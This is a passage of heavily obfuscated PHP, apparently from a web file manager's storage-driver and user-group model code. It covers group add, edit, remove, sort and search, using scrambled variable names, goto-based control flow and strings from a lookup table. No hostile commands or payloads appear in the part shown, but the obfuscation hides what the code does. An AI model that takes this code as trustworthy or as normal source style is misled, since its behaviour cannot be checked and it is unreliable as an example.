(!$BÆãÏ„ˆ››[$C£ Â¥ëÆœ[390]]) { $Aöˆ“˜ìÆ£ = Model($C£ Â¥ëÆœ[558])->getInfo($BÆãÏ„ˆ››[$C£ Â¥ëÆœ[462]]); $CÆ¨ùÜßŞš = KodIO::clear($Aöˆ“˜ìÆ£[$C£ Â¥ëÆœ[1038]] . $BÒñÆ¾ã¿[$C£ Â¥ëÆœ[1031]]); $BÒñÆ¾ã¿[$C£ Â¥ëÆœ[460]] = $Aöˆ“˜ìÆ£; $BÒñÆ¾ã¿[$C£ Â¥ëÆœ[1015]] = $CÆ¨ùÜßŞš; $c—åÅ±å = array($C£ Â¥ëÆœ[1033] => $C£ Â¥ëÆœ[1039], $C£ Â¥ëÆœ[6] => $BÒñÆ¾ã¿); } break; case KodIO::KOD_SHARE_ITEM: $c—åÅ±å = array($C£ Â¥ëÆœ[1033] => $C£ Â¥ëÆœ[1040], $C£ Â¥ëÆœ[6] => $BÒñÆ¾ã¿); $Aöˆ“˜ìÆ£ = Model($C£ Â¥ëÆœ[558])->getInfo($BÒñÆ¾ã¿[$C£ Â¥ëÆœ[388]]); if ($Aöˆ“˜ìÆ£[$C£ Â¥ëÆœ[390]] == $C£ Â¥ëÆœ[491]) { $CÆ¨ùÜßŞš = KodIO::clear($Aöˆ“˜ìÆ£[$C£ Â¥ëÆœ[1038]] . $BÒñÆ¾ã¿[$C£ Â¥ëÆœ[1031]]); $BÒñÆ¾ã¿[$C£ Â¥ëÆœ[460]] = $Aöˆ“˜ìÆ£; $BÒñÆ¾ã¿[$C£ Â¥ëÆœ[1015]] = $CÆ¨ùÜßŞš; $c—åÅ±å = array($C£ Â¥ëÆœ[1033] => $C£ Â¥ëÆœ[1041], $C£ Â¥ëÆœ[6] => $BÒñÆ¾ã¿); } else { if (!$CÆ¨ùÜßŞš) { $CÆ¨ùÜßŞš = $Aöˆ“˜ìÆ£[$C£ Â¥ëÆœ[390]]; } } break; default: $CÆ¨ùÜßŞš = $BÒñÆ¾ã¿[$C£ Â¥ëÆœ[75]]; $c—åÅ±å = array($C£ Â¥ëÆœ[1033] => $C£ Â¥ëÆœ[1042]); break; } $bøƒñòÁ• = $BÒñÆ¾ã¿[$C£ Â¥ëÆœ[75]]; if (!isset(self::$driverCache[$bøƒñòÁ•])) { $Fã•ÕóÆ©© = strtolower($c—åÅ±å[$C£ Â¥ëÆœ[93]]); $D³Ì Å = $GLOBALS[$C£ Â¥ëÆœ[6]][$C£ Â¥ëÆœ[87]][$C£ Â¥ëÆœ[761]]; $A¤òò¤ª “ = $C£ Â¥ëÆœ[71] . (isset($D³Ì Å[$Fã•ÕóÆ©©]) ? $D³Ì Å[$Fã•ÕóÆ©©] : ucfirst($Fã•ÕóÆ©©)); if (!class_exists($A¤òò¤ª “)) { show_json("{$A¤òò¤ª “}\40\156\x6f\164\40\145\x78\x69\163\164\163\x21", !1); } $Dä…ó´„½³ = isset($c—åÅ±å[$C£ Â¥ëÆœ[6]]) ? $c—åÅ±å[$C£ Â¥ëÆœ[6]] : !1; self::$driverCache[$bøƒñòÁ•] = new $A¤òò¤ª “($Dä…ó´„½³); } goto AÌí¥åø£; eì²·„Š±ä: } public static function errorTips($e¯¤¯¡ÉÆ• = false) { goto A„¤‹Õ…; A„¤‹Õ…: $eĞ‘ñ¹½À =& $_SERVER[ç]; static $cä…Û‡‚ = array(); $fìîò ¾È = 1000; goto c¹Ğ‹†‘÷ä; a»©ô³ùŠª: $cä…Û‡‚[] = $e¯¤¯¡ÉÆ•; write_log($eĞ‘ñ¹½À[159] . ACTION . $eĞ‘ñ¹½À[1044] . $e¯¤¯¡ÉÆ•, $eĞ‘ñ¹½À[1045]); goto B¬¦ƒ¨¿¢‰; c¹Ğ‹†‘÷ä: if ($e¯¤¯¡ÉÆ• === -1) { return $cä…Û‡‚ ? $cä…Û‡‚[count($cä…Û‡‚) - 1] : $eĞ‘ñ¹½À[33]; } if ($e¯¤¯¡ÉÆ• === !1) { return implode($eĞ‘ñ¹½À[227], $cä…Û‡‚); } if (count($cä…Û‡‚) >= $fìîò ¾È) { $cä…Û‡‚ = array_slice($cä…Û‡‚, $fìîò ¾È * 0.5, $fìîò ¾È); } goto a»©ô³ùŠª; B¬¦ƒ¨¿¢‰: } public static function getLastError($b”’Ö§Ÿƒ• = '') { $Däñœ¾Ñğ = self::errorTips(-1); return $Däñœ¾Ñğ ? $Däñœ¾Ñğ : $b”’Ö§Ÿƒ•; } } goto bõ‘±«ø¸÷; a¢°ãß–¬Ô: class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\160"; protected $tableMeta = array("\164\141\142\154\x65\x4e\x61\155\x65" => "\147\162\x6f\165\160\137\155\x65\x74\x61", "\155\x65\x74\141\x46\151\145\154\144" => "\147\162\157\x75\x70\x49\104"); protected function cacheFunctionAlias($Eê©ËÆ¹ò) { $E¯Ü¤Ğ„á =& $_SERVER[ç]; return array($E¯Ü¤Ğ„á[1725] => array($Eê©ËÆ¹ò[0], $E¯Ü¤Ğ„á[1726]), $E¯Ü¤Ğ„á[1727] => array($Eê©ËÆ¹ò[0], $E¯Ü¤Ğ„á[1726])); } protected function getInfo($E©Â¼œùíá) { $Bê·Ó‹ÈŠÉ = $this->getInfoSimple($E©Â¼œùíá); if (!$Bê·Ó‹ÈŠÉ) { return !1; } return $this->_listDataApplyItem($Bê·Ó‹ÈŠÉ); } protected function getInfoSimple($AÜ Ùè–ê, $E‰Îš„° = false) { $bÙŠÙîìÑÏ =& $_SERVER[ç]; if ($E‰Îš„°) { $aØ‰‡ùÖ¥ = array($bÙŠÙîìÑÏ[1654] => intval($AÜ Ùè–ê)); $d±÷ëŒù’á = $this->where($aØ‰‡ùÖ¥)->find(); return is_array($d±÷ëŒù’á) ? $d±÷ëŒù’á : array(); } return $this->cacheFunctionGet($bÙŠÙîìÑÏ[1728], $AÜ Ùè–ê); } protected function groupAdd($d©ˆƒ“É†) { goto d‹¥Æ£÷Ç; Bñˆ˜Ş¾Ü: if (isset($d©ˆƒ“É†[$E†ŠÍŞŠöä[1731]])) { $this->metaSet($BŠÇ¼°¶×Î, array($E†ŠÍŞŠöä[1731] => $d©ˆƒ“É†[$E†ŠÍŞŠöä[1731]], $E†ŠÍŞŠöä[1732] => $d©ˆƒ“É†[$E†ŠÍŞŠöä[1732]])); unset($d©ˆƒ“É†[$E†ŠÍŞŠöä[1731]]); unset($d©ˆƒ“É†[$E†ŠÍŞŠöä[1732]]); } Model($E†ŠÍŞŠöä[1171])->groupRootAdd($BŠÇ¼°¶×Î); return $BŠÇ¼°¶×Î; goto aÀì‰Ö¤™Å; càå‡­Õ©‚: if ($E´Ç‚“´³ë[$E†ŠÍŞŠöä[481]]) { $e×…Ò°×…í = $E´Ç‚“´³ë[$E†ŠÍŞŠöä[481]] . $E´Ç‚“´³ë[$E†ŠÍŞŠöä[1654]] . $E†ŠÍŞŠöä[47]; } $fŠ†¡ğá³ = array($E†ŠÍŞŠöä[407] => $this->groupNameAuto($d©ˆƒ“É†[$E†ŠÍŞŠöä[472]], $d©ˆƒ“É†[$E†ŠÍŞŠöä[28]]), $E†ŠÍŞŠöä[389] => $d©ˆƒ“É†[$E†ŠÍŞŠöä[472]], $E†ŠÍŞŠöä[548] => $e×…Ò°×…í, $E†ŠÍŞŠöä[1729] => $d©ˆƒ“É†[$E†ŠÍŞŠöä[1638]], $E†ŠÍŞŠöä[1730] => 0, $E†ŠÍŞŠöä[1658] => 0); if (isset($d©ˆƒ“É†[$E†ŠÍŞŠöä[1677]])) { $fŠ†¡ğá³[$E†ŠÍŞŠöä[1677]] = $d©ˆƒ“É†[$E†ŠÍŞŠöä[1677]]; } else { $aº—¥ï´É© = $this->max($E†ŠÍŞŠöä[1677]); if (!$aº—¥ï´É©) { $aº—¥ï´É© = 0; } $fŠ†¡ğá³[$E†ŠÍŞŠöä[1677]] = $aº—¥ï´É© + 1; } goto Fš‰´¨‘Ìµ; d‹¥Æ£÷Ç: $E†ŠÍŞŠöä =& $_SERVER[ç]; if (!$d©ˆƒ“É†[$E†ŠÍŞŠöä[472]] && isset($d©ˆƒ“É†[$E†ŠÍŞŠöä[1654]]) && $d©ˆƒ“É†[$E†ŠÍŞŠöä[1654]] == 1) { if ($E´Ç‚“´³ë = $this->getInfoSimple($d©ˆƒ“É†[$E†ŠÍŞŠöä[1654]], !0)) { return $d©ˆƒ“É†[$E†ŠÍŞŠöä[1654]]; } } else { $E´Ç‚“´³ë = $this->getInfoSimple($d©ˆƒ“É†[$E†ŠÍŞŠöä[472]]); if (!$E´Ç‚“´³ë) { return !1; } } $e×…Ò°×…í = $E†ŠÍŞŠöä[493]; goto càå‡­Õ©‚; Fš‰´¨‘Ìµ: if (!empty($d©ˆƒ“É†[$E†ŠÍŞŠöä[1654]])) { $fŠ†¡ğá³[$E†ŠÍŞŠöä[1654]] = $d©ˆƒ“É†[$E†ŠÍŞŠöä[1654]]; } $BŠÇ¼°¶×Î = $this->add($fŠ†¡ğá³); $this->setNamePinyin($BŠÇ¼°¶×Î, $fŠ†¡ğá³[$E†ŠÍŞŠöä[28]]); goto Bñˆ˜Ş¾Ü; aÀì‰Ö¤™Å: } protected function groupEdit($a–‘ÃÙğ¥Â, $d´àëïª¹Â) { goto cÅ“£©Û; fãÁº¶íÏÚ: if (!empty($d´àëïª¹Â[$fÉ‹šÎò×†[472]])) { $A½ÜÕŒ–öŒ = $this->getInfoSimple($d´àëïª¹Â[$fÉ‹šÎò×†[472]]); if (!$A½ÜÕŒ–öŒ) { return !1; } if ($DêØÜ» ‡Ú[$fÉ‹šÎò×†[1654]] == $A½ÜÕŒ–öŒ[$fÉ‹šÎò×†[1654]]) { return !1; } if ($d´àëïª¹Â[$fÉ‹šÎò×†[472]] != $DêØÜ» ‡Ú[$fÉ‹šÎò×†[472]]) { if ($A½ÜÕŒ–öŒ[$fÉ‹šÎò×†[481]] !== $DêØÜ» ‡Ú[$fÉ‹šÎò×†[481]] && strpos($A½ÜÕŒ–öŒ[$fÉ‹šÎò×†[481]], $DêØÜ» ‡Ú[$fÉ‹šÎò×†[481]] . $DêØÜ» ‡Ú[$fÉ‹šÎò×†[1654]] . $fÉ‹šÎò×†[47]) === 0) { return !1; } $d´àëïª¹Â[$fÉ‹šÎò×†[548]] = $A½ÜÕŒ–öŒ[$fÉ‹šÎò×†[481]] . $d´àëïª¹Â[$fÉ‹šÎò×†[472]] . $fÉ‹šÎò×†[47]; $this->_changeChildLevel($DêØÜ» ‡Ú, $A½ÜÕŒ–öŒ); } } if (isset($d´àëïª¹Â[$fÉ‹šÎò×†[28]])) { $this->setNamePinyin($a–‘ÃÙğ¥Â, $d´àëïª¹Â[$fÉ‹šÎò×†[28]]); } if (isset($d´àëïª¹Â[$fÉ‹šÎò×†[1731]])) { $this->metaSet($a–‘ÃÙğ¥Â, array($fÉ‹šÎò×†[1731] => $d´àëïª¹Â[$fÉ‹šÎò×†[1731]], $fÉ‹šÎò×†[1732] => $d´àëïª¹Â[$fÉ‹šÎò×†[1732]])); unset($d´àëïª¹Â[$fÉ‹šÎò×†[1731]]); unset($d´àëïª¹Â[$fÉ‹šÎò×†[1732]]); } goto F­ÙŒ¿¨‘—; F­ÙŒ¿¨‘—: if (isset($d´àëïª¹Â[$fÉ‹šÎò×†[28]]) && $d´àëïª¹Â[$fÉ‹šÎò×†[28]] != $DêØÜ» ‡Ú[$fÉ‹šÎò×†[28]]) { $this->_clearChildrenCache($DêØÜ» ‡Ú); } return $this->where(array($fÉ‹šÎò×†[1733] => $a–‘ÃÙğ¥Â))->save($d´àëïª¹Â); goto fá‡½ØŒÙ…; cÅ“£©Û: $fÉ‹šÎò×† =& $_SERVER[ç]; $DêØÜ» ‡Ú = $this->getInfoSimple($a–‘ÃÙğ¥Â); if (!$DêØÜ» ‡Ú) { return !1; } goto fãÁº¶íÏÚ; fá‡½ØŒÙ…: } private function _clearChildrenCache($B•¿ÍÌ‚¥Æ) { $eÛõ–ÔßĞÚ =& $_SERVER[ç]; $Dáœ„Ïåè„ = array($eÛõ–ÔßĞÚ[548] => array($eÛõ–ÔßĞÚ[507], $B•¿ÍÌ‚¥Æ[$eÛõ–ÔßĞÚ[481]] . $B•¿ÍÌ‚¥Æ[$eÛõ–ÔßĞÚ[1654]] . $eÛõ–ÔßĞÚ[508])); $b—ºŠÀ½¹® = $this->field($eÛõ–ÔßĞÚ[1654])->where($Dáœ„Ïåè„)->select(); foreach ($b—ºŠÀ½¹® as $BöÌ„…°±¹) { $this->cacheFunctionClear($eÛõ–ÔßĞÚ[1734], $BöÌ„…°±¹[$eÛõ–ÔßĞÚ[1654]]); $this->cacheFunctionClear($eÛõ–ÔßĞÚ[1728], $BöÌ„…°±¹[$eÛõ–ÔßĞÚ[1654]]); } } private function _changeChildLevel($fŒ…¢¥ìñš, $E—œì“Ì‰, $dƒ´¦ÒÂ = false) { goto b¢×ƒ÷îÃÉ; b¾²òØ³½é: $this->_clearChildrenCache($fŒ…¢¥ìñš); $this->where($E¡å’¯¥¥)->data($f¹‘™ÚÂ÷Ì)->save(); goto CéĞÈˆ¡Ş¾; E•Ã®ãÃ³¯: if ($dƒ´¦ÒÂ) { $A¥šëŒù«¸ = $E—œì“Ì‰[$dËàÕïÓï[481]] . $E—œì“Ì‰[$dËàÕïÓï[1654]] . $dËàÕïÓï[47]; } $E¡å’¯¥¥ = array($dËàÕïÓï[548] => array($dËàÕïÓï[507], $fŒ…¢¥ìñš[$dËàÕïÓï[481]] . $fŒ…¢¥ìñš[$dËàÕïÓï[1654]] . $dËàÕïÓï[508])); $f¹‘™ÚÂ÷Ì = array($dËàÕïÓï[548] => array($dËàÕïÓï[556], "\x72\x65\160\154\141\143\145\50\160\x61\162\145\156\x74\114\x65\x76\145\x6c\54\47{$Bõ‰ÌÎƒè¥}\47\x2c\47{$A¥šëŒù«¸}\x27\51")); goto b¾²òØ³½é; b¢×ƒ÷îÃÉ: $dËàÕïÓï =& $_SERVER[ç]; $Bõ‰ÌÎƒè¥ = $fŒ…¢¥ìñš[$dËàÕïÓï[481]] . $fŒ…¢¥ìñš[$dËàÕïÓï[1654]] . $dËàÕïÓï[47]; $A¥šëŒù«¸ = $E—œì“Ì‰[$dËàÕïÓï[481]] . $E—œì“Ì‰[$dËàÕïÓï[1654]] . $dËàÕïÓï[47] . $fŒ…¢¥ìñš[$dËàÕïÓï[1654]] . $dËàÕïÓï[47]; goto E•Ã®ãÃ³¯; CéĞÈˆ¡Ş¾: } public function setNamePinyin($E†Êî¢éè…, $fùÓîØšÍÜ = false) { $bˆ˜Ğ—µğö =& $_SERVER[ç]; if (!$fùÓîØšÍÜ) { $B‹–äìÙÌ = $this->getInfoSimple($E†Êî¢éè…); $fùÓîØšÍÜ = $B‹–äìÙÌ[$bˆ˜Ğ—µğö[28]]; } if (!Input::check($fùÓîØšÍÜ, $bˆ˜Ğ—µğö[551])) { $this->metaSet($E†Êî¢éè…, $bˆ˜Ğ—µğö[438], null); $this->metaSet($E†Êî¢éè…, $bˆ˜Ğ—µğö[437], null); return; } $BßõîŠ»«‡ = array($bˆ˜Ğ—µğö[438] => str_replace($bˆ˜Ğ—µğö[50], $bˆ˜Ğ—µğö[33], Pinyin::encode($fùÓîØšÍÜ)), $bˆ˜Ğ—µğö[437] => Pinyin::encode($fùÓîØšÍÜ, $bˆ˜Ğ—µğö[552])); $this->metaSet($E†Êî¢éè…, $BßõîŠ»«‡); } protected function groupStatus($E›µÚ…Úİ§, $B¤·™”¡Ì¿) { goto CÆ·³‡ó˜Å; CòÕ¯ŒĞåø: if ($B¤·™”¡Ì¿ == $EŠ´’Ã´ÔŸ[86]) { $e‚¯×ƒ©§‰ = $this->parentLevelArray($EŠ¶»ìÊéÑ[$EŠ´’Ã´ÔŸ[481]]); } else { $Fâ§ã¢º¸° = array($EŠ´’Ã´ÔŸ[548] => array($EŠ´’Ã´ÔŸ[507], $EŠ¶»ìÊéÑ[$EŠ´’Ã´ÔŸ[481]] . $EŠ¶»ìÊéÑ[$EŠ´’Ã´ÔŸ[1654]] . $EŠ´’Ã´ÔŸ[508])); $e‚¯×ƒ©§‰ = $this->where($Fâ§ã¢º¸°)->field($EŠ´’Ã´ÔŸ[1654])->select(); $e‚¯×ƒ©§‰ = array_to_keyvalue($e‚¯×ƒ©§‰, $EŠ´’Ã´ÔŸ[33], $EŠ´’Ã´ÔŸ[1654]); } $e‚¯×ƒ©§‰[] = $EŠ¶»ìÊéÑ[$EŠ´’Ã´ÔŸ[1654]]; $eî¥í—‚³¶ = array(); goto e×«Ä›¿; CÆ·³‡ó˜Å: $EŠ´’Ã´ÔŸ =& $_SERVER[ç]; $EŠ¶»ìÊéÑ = $this->getInfoSimple($E›µÚ…Úİ§); if (!$EŠ¶»ìÊéÑ) { return !1; } goto CòÕ¯ŒĞåø; e×«Ä›¿: foreach ($e‚¯×ƒ©§‰ as $E›µÚ…Úİ§) { $eî¥í—‚³¶[] = array($EŠ´’Ã´ÔŸ[1654] => $E›µÚ…Úİ§, $EŠ´’Ã´ÔŸ[92] => $EŠ´’Ã´ÔŸ[695], $EŠ´’Ã´ÔŸ[370] => $B¤·™”¡Ì¿); } return Model($EŠ´’Ã´ÔŸ[1735])->addAll($eî¥í—‚³¶, array(), !0); goto D²ÉƒŒ›Ğ´; D²ÉƒŒ›Ğ´: } protected function groupRemove($fİà‰›Âù†) { goto aáàƒõĞ£î; aÁ¼¶™ˆëÇ: Model($aºŠ…’í§Œ[760])->groupRootRemove($fİà‰›Âù†); return $this->where($FÏòÑ¹–‰á)->delete(); goto fÛñ•²ƒ¦“; B¨šÖ¬ù‚Å: $this->where(array($aºŠ…’í§Œ[472] => $fİà‰›Âù†))->save(array($aºŠ…’í§Œ[472] => $Fæ†İó™í’[$aºŠ…’í§Œ[472]])); Model($aºŠ…’í§Œ[1735])->where($FÏòÑ¹–‰á)->delete(); Model($aºŠ…’í§Œ[1736])->where($FÏòÑ¹–‰á)->delete(); goto aÁ¼¶™ˆëÇ; aáàƒõĞ£î: $aºŠ…’í§Œ =& $_SERVER[ç]; $FÏòÑ¹–‰á = array($aºŠ…’í§Œ[1654] => $fİà‰›Âù†); $Fæ†İó™í’ = $this->where($FÏòÑ¹–‰á)->find(); goto c‘æàì‹·; c‘æàì‹·: if (!$Fæ†İó™í’ || $Fæ†İó™í’[$aºŠ…’í§Œ[472]] == 0) { return !1; } $Bá”·›ËË” = $this->getInfoSimple($Fæ†İó™í’[$aºŠ…’í§Œ[472]]); $this->_changeChildLevel($Fæ†İó™í’, $Bá”·›ËË”, !0); goto B¨šÖ¬ù‚Å; fÛñ•²ƒ¦“: } protected function groupSort($f’ÖÀÔÌó“) { $E„à³ƒØ‡ =& $_SERVER[ç]; $fÓÃŠé·Ú = array(); foreach ($f’ÖÀÔÌó“ as $b£À†šà¾¢ => $CŠèãÇïÌÒ) { $fÓÃŠé·Ú[] = array($E„à³ƒØ‡[1654], $CŠèãÇïÌÒ, $E„à³ƒØ‡[1677], $b£À†šà¾¢ + 1); } $this->saveAll($fÓÃŠé·Ú); } public function listData() { $bÖğŒÚâÏñ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($bÖğŒÚâÏñ[$_SERVER[ç][365]]); return $bÖğŒÚâÏñ; } private function _makeOrder($A´õğÂ™« = '') { goto eÈŠİ—âù; D«ñŒ¶Ú: $d·ä•±´£ = Input::get($c„¶†âˆ¯·[429], $c„¶†âˆ¯·[7], $c„¶†âˆ¯·[1658], $dÉÄ†ŒÄå); $cçÏ²ÀÛ” = Input::get($c„¶†âˆ¯·[430], $c„¶†âˆ¯·[7], $c„¶†âˆ¯·[1737], array($c„¶†âˆ¯·[1737], $c„¶†âˆ¯·[424])); $cçÏ²ÀÛ” = $fà ñÄ‰¨Î[$cçÏ²ÀÛ”]; goto Dš‚åã¼¹; eÈŠİ—âù: $c„¶†âˆ¯· =& $_SERVER[ç]; $dÉÄ†ŒÄå = array($c„¶†âˆ¯·[1654], $c„¶†âˆ¯·[28], $c„¶†âˆ¯·[1640], $c„¶†âˆ¯·[192]); $fà ñÄ‰¨Î = array($c„¶†âˆ¯·[422] => $c„¶†âˆ¯·[423], $c„¶†âˆ¯·[424] => $c„¶†âˆ¯·[425]); goto D«ñŒ¶Ú; Dš‚åã¼¹: $A´õğÂ™« = $A´õğÂ™« . "{$d·ä•±´£}\40{$cçÏ²ÀÛ”}\x2c\x20\x67\162\157\165\x70\111\104\x20\x61\x73\143"; return $this->order($A´õğÂ™«); goto C—Ş¼çŒÆ—; C—Ş¼çŒÆ—: } public function listChild($D ËÂÎÙÓ®) { $Fˆ•ÑáÁù‚ =& $_SERVER[ç]; $eŠ¶”íô³Ê = $this->where(array($Fˆ•ÑáÁù‚[472] => $D ËÂÎÙÓ®))->_makeOrder()->selectPage(200); $this->_listDataApply($eŠ¶”íô³Ê[$Fˆ•ÑáÁù‚[365]]); return $eŠ¶”íô³Ê; } public function listByID($Eç¨šİµéö) { $cÏã¶ªó†Ò =& $_SERVER[ç]; if (!$Eç¨šİµéö) { return array(); } $Aí–ÕµŠôä = array($cÏã¶ªó†Ò[1654] => array($cÏã¶ªó†Ò[7], $Eç¨šİµéö)); $AĞèĞçÌŞµ = $this->where($Aí–ÕµŠôä)->select(); $this->_listDataApply($AĞèĞçÌŞµ); return $AĞèĞçÌŞµ; } public function listSearch($FÓ¯ö‘Œò) { goto C“ê›ÚÀå¬; eô’ÔìÕª: return $E£ôåÍÂ“; goto EÍÍî•¤”«; Fí…•Ì»å¨: if (!trim($Fª¤è°Ã˜õ)) { return !1; } $Fª¤è°Ã˜õ = str_replace($Eİ‹Ñ ÛÒÇ[1740], $Eİ‹Ñ ÛÒÇ[1741], $Fª¤è°Ã˜õ); $E›­º¡„ê = array($Eİ‹Ñ ÛÒÇ[1654] => array($Eİ‹Ñ ÛÒÇ[378], "{$Fª¤è°Ã˜õ}\45"), $Eİ‹Ñ ÛÒÇ[28] => array($Eİ‹Ñ ÛÒÇ[378], "\45{$Fª¤è°Ã˜õ}\x25"), $Eİ‹Ñ ÛÒÇ[925] => $Eİ‹Ñ ÛÒÇ[1742]); goto BÄğÌå¾å‹; BÄğÌå¾å‹: if ($FØÃçÀ›¹¥) { $DòÂ‰ë¨âİ = $this->getInfoSimple($FØÃçÀ›¹¥); $b—ôƒÕŞÃ = $DòÂ‰ë¨âİ[$Eİ‹Ñ ÛÒÇ[481]] . $FØÃçÀ›¹¥ . $Eİ‹Ñ ÛÒÇ[508]; $E›­º¡„ê = array($E›­º¡„ê, array($Eİ‹Ñ ÛÒÇ[481] => array($Eİ‹Ñ ÛÒÇ[378], $b—ôƒÕŞÃ))); } $E›­º¡„ê = $this->parseWhereLike($E›­º¡„ê); $E£ôåÍÂ“ = $this->_makeOrder()->where($E›­º¡„ê)->selectPage(20); goto føïƒóÕ›; føïƒóÕ›: $E£ôåÍÂ“ = $E£ôåÍÂ“ ? $E£ôåÍÂ“ : array(); if (!$E£ôåÍÂ“ || count($E£ôåÍÂ“[$Eİ‹Ñ ÛÒÇ[365]]) < 5 && Input::check($Fª¤è°Ã˜õ, $Eİ‹Ñ ÛÒÇ[314])) { goto Eœ¶Ÿˆ¦Ì»; Eœ¶Ÿˆ¦Ì»: $b¦¬ƒ“…µĞ = $this->groupChildrenAll($FØÃçÀ›¹¥); $AŠ«ì™Üõá = $this->_searchFromMeta($Eİ‹Ñ ÛÒÇ[437], $Fª¤è°Ã˜õ, 10, $b¦¬ƒ“…µĞ); $c¬ˆåêáÃğ = $this->_searchFromMeta($Eİ‹Ñ ÛÒÇ[438], $Fª¤è°Ã˜õ, 10, $b¦¬ƒ“…µĞ); goto aŒ¢ÁõÊŸÖ; aŒ¢ÁõÊŸÖ: $eœí†ßáÊ® = array_merge($AŠ«ì™Üõá, $c¬ˆåêáÃğ, $E£ôåÍÂ“[$Eİ‹Ñ ÛÒÇ[365]]); $E£ôåÍÂ“[$Eİ‹Ñ ÛÒÇ[365]] = array_unique_by_key($eœí†ßáÊ®, $Eİ‹Ñ ÛÒÇ[1654]); $E£ôåÍÂ“[$Eİ‹Ñ ÛÒÇ[362]][$Eİ‹Ñ ÛÒÇ[363]] = count($E£ôåÍÂ“[$Eİ‹Ñ ÛÒÇ[365]]); goto d¬ÔìË¿™ˆ; d¬ÔìË¿™ˆ: $E£ôåÍÂ“[$Eİ‹Ñ ÛÒÇ[362]][$Eİ‹Ñ ÛÒÇ[364]] = ceil($E£ôåÍÂ“[$Eİ‹Ñ ÛÒÇ[362]][$Eİ‹Ñ ÛÒÇ[363]] / $E£ôåÍÂ“[$Eİ‹Ñ ÛÒÇ[362]][$Eİ‹Ñ ÛÒÇ[359]]); goto Fßİáğ²Å•; Fßİáğ²Å•: } $this->_listDataApply($E£ôåÍÂ“[$Eİ‹Ñ ÛÒÇ[365]]); goto eô’ÔìÕª; C“ê›ÚÀå¬: $Eİ‹Ñ ÛÒÇ =& $_SERVER[ç]; $Fª¤è°Ã˜õ = $FÓ¯ö‘Œò[$Eİ‹Ñ ÛÒÇ[1738]]; $FØÃçÀ›¹¥ = isset($FÓ¯ö‘Œò[$Eİ‹Ñ ÛÒÇ[1739]]) ? $FÓ¯ö‘Œò[$Eİ‹Ñ ÛÒÇ[1739]] : !1; goto Fí…•Ì»å¨; EÍÍî•¤”«: } protected function groupChildrenAll($F–²´ƒà†¿) { $C…ºñí =& $_SERVER[ç]; if (!$F–²´ƒà†¿) { return !1; } if (is_string($F–²´ƒà†¿)) { $F–²´ƒà†¿ = array($F–²´ƒà†¿); } $cæ­âÉ§óŸ = $F–²´ƒà†¿; foreach ($F–²´ƒà†¿ as $bšÙÅİ·òÓ) { $Cæ¸†àÆİ = $this->getInfoSimple($bšÙÅİ·òÓ); $A¼‹Ä¸Ùéæ = array($C…ºñí[481] => array($C…ºñí[378], $Cæ¸†àÆİ[$C…ºñí[481]] . $bšÙÅİ·òÓ . $C…ºñí[508])); $cŠêŠ«ÖĞÜ = $this->field($C…ºñí[1654])->where($A¼‹Ä¸Ùéæ)->select(); $cæ­âÉ§óŸ = array_merge($cæ­âÉ§óŸ, array_to_keyvalue($cŠêŠ«ÖĞÜ, $C…ºñí[33], $C…ºñí[1654])); } return array_unique($cæ­âÉ§óŸ); } private function _searchFromMeta($FÀ¾îÏÅ“, $BÏèÃæœ˜ƒ, $A¤„¸¢±·, $cÍö›ÁŒõ˜) { goto cˆÉÃµ¶‹¯; B‹ŸÃğì²ï: if (!$bÏ½öé“–ë) { return array(); } return $bÏ½öé“–ë; goto aÍÉœé›ÀÍ; c ¯âÅÍæí: $E¥ÕÚ˜ ‘¶ = $this->parseWhereLike($E¥ÕÚ˜ ‘¶); if ($cÍö›ÁŒõ˜) { $E¥ÕÚ˜ ‘¶[$DÔƒì¦¬‡Ã[1654]] = array($DÔƒì¦¬‡Ã[7], $cÍö›ÁŒõ˜); } $bëó™õË‹È = Model($DÔƒì¦¬‡Ã[1743])->where($E¥ÕÚ˜ ‘¶)->limit($A¤„¸¢±·)->select(); goto f¥„Öæ›‘¯; cˆÉÃµ¶‹¯: $DÔƒì¦¬‡Ã =& $_SERVER[ç]; $BÏèÃæœ˜ƒ = strtolower($BÏèÃæœ˜ƒ); $E¥ÕÚ˜ ‘¶ = array($DÔƒì¦¬‡Ã[92] => $FÀ¾îÏÅ“, $DÔƒì¦¬‡Ã[370] => array($DÔƒì¦¬‡Ã[378], "\x25{$BÏèÃæœ˜ƒ}\x25")); goto c ¯âÅÍæí; f¥„Öæ›‘¯: if (!$bëó™õË‹È) { return array(); } $bëó™õË‹È = array_to_keyvalue($bëó™õË‹È, $DÔƒì¦¬‡Ã[33], $DÔƒì¦¬‡Ã[1654]); $bÏ½öé“–ë = $this->where(array($DÔƒì¦¬‡Ã[1733] => array($DÔƒì¦¬‡Ã[7], $bëó™õË‹È)))->select(); goto B‹ŸÃğì²ï; aÍÉœé›ÀÍ: } protected function _listDataApplyItem($C¿ë•’â‡ä) { $Dğ–Ò×˜“ = array($C¿ë•’â‡ä); $this->_listDataApply($Dğ–Ò×˜“); return $Dğ–Ò×˜“[0]; } protected function _listDataApply(&$BÜ¦‰â©·) { goto c‰¿Ü¬È£; A¾Ù„…ÛÍŒ: $this->_listAppendChildren($BÜ¦‰â©·); $this->_listAppendChildrenMember($BÜ¦‰â©·); $this->_listAppendMeta($BÜ¦‰â©·, $dºÊÜö„); goto aö¥Øğîïµ; aö¥Øğîïµ: $this->_listAppendParent($BÜ¦‰â©·); $this->_listAppendSourceRoot($BÜ¦‰â©·, $dºÊÜö„); goto Bƒ ‘ìÄ·¤; c‰¿Ü¬È£: $Bô„øœ×åÂ =& $_SERVER[ç]; if (!$BÜ¦‰â©·) { return; } $dºÊÜö„ = array_to_keyvalue($BÜ¦‰â©·, $Bô„øœ×åÂ[33], $Bô„øœ×åÂ[1654]); goto A¾Ù„…ÛÍŒ; Bƒ ‘ìÄ·¤: } private function _listAppendChildren(&$bªÃºîÅÅï) { goto a’¥¸·®…­; a’¥¸·®…­: $a§œÒ—ĞÊ =& $_SERVER[ç]; $A¿„™´äÏ = array_to_keyvalue($bªÃºîÅÅï, $a§œÒ—ĞÊ[33], $a§œÒ—ĞÊ[1654]); $E¥ßÀ„É¶ = array($a§œÒ—ĞÊ[472] => array($a§œÒ—ĞÊ[7], $A¿„™´äÏ)); goto cŞÁ¼Óğˆø; aÔç–´ªÓ: foreach ($bªÃºîÅÅï as &$eÖÆÎ›­‰¾) { $cÙ¨ğÚç’ª = $eÖÆÎ›­‰¾[$a§œÒ—ĞÊ[1654]]; $eÖÆÎ›­‰¾[$a§œÒ—ĞÊ[1745]] = isset($CˆÁ©Ù¢§Œ[$cÙ¨ğÚç’ª]) ? 